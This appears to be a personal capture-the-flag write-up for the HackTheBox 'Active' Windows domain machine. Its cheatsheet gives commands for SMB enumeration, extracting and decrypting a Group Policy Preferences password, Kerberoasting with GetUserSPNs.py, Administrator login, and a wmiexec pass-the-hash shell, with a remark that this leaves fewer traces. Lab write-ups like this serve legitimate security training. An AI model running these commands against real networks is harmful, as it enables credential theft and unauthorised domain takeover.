# Active \[Windows AD Easy]

{% embed url="https://medium.com/r3d-buck3t/attacking-service-accounts-with-kerberoasting-with-spns-de9894ca243f" %}

{% embed url="https://0xdf.gitlab.io/2018/12/08/htb-active.html" %}

## Report

Enumerate SMB shares to find Group.xml.&#x20;

In previous Windows versions, Group Policy Preferences allowed administrators to modify users and groups across their network. AES encrypted but Microsoft leaked it meaning all those passwords are useless now so if you find this calm.

FInd username and password for it.

Now perform kerboroasting, run GetUserSPNs.py to&#x20;

## Cheatsheet

```
smbclient -L <ip>
smbclient -N -L //10.10.10.100

smbmap -H <ip> -r Replication --depth 2  [depending on depth go further in]
smbmap -H <ip> -r Replication --depth 7 
smbmap -H 10.10.10.100 --download Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml

gpp-decrypt <hash>

python3 GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 
python3 GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100  -request <get ticket here>

smbmap/ smbclient to login as admin
smbclient //10.10.10.100/Users -U Administrator
```

## Proof

Groups.xml is located at `\\SYSVOL<DOMAIN>\Policies\`

The Replication folder is just a copy of SYSVOL, use gpp-decrypt to get the password.

**Service Principal Names (SPNs) -** _maps the host/user service accounts to running services._

> _If you find this **error** from Linux: **Kerberos SessionError: KRB\_AP\_ERR\_SKEW(Clock skew too great)** it because of your local time, you need to synchronize the host with the DC:_
>
> _**ntpdate \<IP of DC>**_

## TODO

We did on Linux, possible on WIndows with PowerView, first article shows how.

Ippsec ran Bloodhound on this, how get a shell to use wo evil-winrm and switching to Windows box?

`wmiexec.py -hashes <hash> htb.local/administrator@10.10.10.161`

This tool does give us a shell, do check it out could be handy

{% embed url="https://medium.com/@allypetitt/windows-remoting-difference-between-psexec-wmiexec-atexec-exec-bf7d1edb5986" %}
wmiexec best, no write on disk so leave less trace, need write priv to $admin for all?
{% endembed %}
